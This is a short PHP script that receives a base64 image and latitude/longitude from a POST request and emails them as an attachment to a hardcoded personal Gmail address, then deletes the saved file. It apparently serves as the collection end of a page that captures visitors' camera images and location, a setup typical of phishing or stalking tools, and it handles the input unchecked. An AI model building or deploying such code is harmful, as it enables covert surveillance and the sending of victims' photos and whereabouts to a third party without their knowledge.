<?php
// Get image data, latitude, and longitude from POST request
$imageDataURL = $_POST['image'];
$latitude = $_POST['latitude'];
$longitude = $_POST['longitude'];

// Save image to file
$imageData = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $imageDataURL));
$imageFilename = 'captured_image.jpg';
file_put_contents($imageFilename, $imageData);

// Send email with image and geolocation
$to = 'samratthapa2045@gmail.com';
$subject = 'Captured Image with Geolocation';
$message = 'Latitude: ' . $latitude . PHP_EOL . 'Longitude: ' . $longitude;
$headers = 'From: sender@example.com' . "\r\n" .
    'Reply-To: samratthapa2045@gmail.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

// Attach image to email
$attachment = chunk_split(base64_encode(file_get_contents($imageFilename)));
$boundary = md5(time());
$headers .= "MIME-Version: 1.0\r\n" .
    "Content-Type: multipart/mixed; boundary=\"{$boundary}\"\r\n\r\n";
$body = "--{$boundary}\r\n" .
    "Content-Type: text/plain; charset=\"UTF-8\"\r\n" .
    "Content-Transfer-Encoding: 7bit\r\n\r\n" .
    $message . "\r\n\r\n" .
    "--{$boundary}\r\n" .
    "Content-Type: image/jpeg; name=\"{$imageFilename}\"\r\n" .
    "Content-Transfer-Encoding: base64\r\n" .
    "Content-Disposition: attachment\r\n\r\n" .
    $attachment . "\r\n\r\n" .
    "--{$boundary}--";
mail($to, $subject, $body, $headers);

// Delete image file
unlink($imageFilename);

echo 'Email sent successfully';
?>
